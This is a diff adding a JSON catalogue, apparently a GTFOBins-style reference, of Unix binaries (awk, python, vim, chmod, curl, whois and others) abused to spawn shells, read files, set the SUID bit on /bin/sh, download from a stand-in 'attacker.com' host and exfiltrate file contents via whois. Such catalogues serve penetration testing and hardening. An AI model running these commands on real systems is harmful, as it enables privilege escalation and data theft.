@@ -1,0 +1,72 @@
+{
+    "awk": [
+        {
+            "function": "shell",
+            "code": "awk 'BEGIN {system(\"/bin/sh\")}'",
+            "description": "RCE via awk"
+        }
+    ],
+    "base64": [
+        {
+            "function": "file-read",
+            "code": "base64 file_to_read | base64 --decode",
+            "description": "Read file via base64"
+        }
+    ],
+    "bash": [
+        {
+            "function": "shell",
+            "code": "bash",
+            "description": "Spawns a shell"
+        }
+    ],
+    "cat": [
+        {
+            "function": "file-read",
+            "code": "cat file_to_read",
+            "description": "Read file"
+        }
+    ],
+    "chmod": [
+        {
+            "function": "suid",
+            "code": "chmod 4000 /bin/sh",
+            "description": "Set SUID bit"
+        }
+    ],
+    "cp": [
+        {
+            "function": "file-write",
+            "code": "cp /bin/sh /tmp/sh",
+            "description": "Copy file"
+        }
+    ],
+    "curl": [
+        {
+            "function": "file-download",
+            "code": "curl http://attacker.com/file -o /tmp/file",
+            "description": "Download file"
+        }
+    ],
+    "python": [
+        {
+            "function": "shell",
+            "code": "python -c 'import os; os.system(\"/bin/sh\")'",
+            "description": "RCE via Python"
+        }
+    ],
+    "vim": [
+        {
+            "function": "shell",
+            "code": ":!/bin/sh",
+            "description": "Shell escape via vim"
+        }
+    ],
+    "whois": [
+        {
+            "function": "file-read",
+            "code": "whois -h 127.0.0.1 -p 4444 `cat file_to_read`",
+            "description": "Exfiltrate file via whois"
+        }
+    ]
+}
